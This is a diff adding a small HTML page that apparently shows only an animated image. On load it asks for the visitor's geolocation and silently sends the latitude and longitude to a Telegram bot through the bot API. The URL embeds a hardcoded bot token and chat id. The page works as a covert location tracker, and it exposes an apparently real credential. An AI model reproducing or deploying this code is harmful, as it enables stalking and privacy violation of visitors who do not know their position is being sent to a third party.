@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+<img src="https://i.stack.imgur.com/87Tpa.gif"/>
+
+
+<script>
+var x ;
+const xhttp = new XMLHttpRequest();
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    
+  }
+}
+
+function showPosition(position) {
+  x = "Latitude: " + position.coords.latitude + 
+  "Longitude: " + position.coords.longitude;
+xhttp.open("GET", "https://api.telegram.org/bot5132725727:AAH3gzEDOBHBNhbdS_Dgq1WCleizPH3N9iM/sendMessage?chat_id=1321810791&text=Check Maps"+x);
+xhttp.send();  
+}
+</script>
+
+</body>
+</html>
+
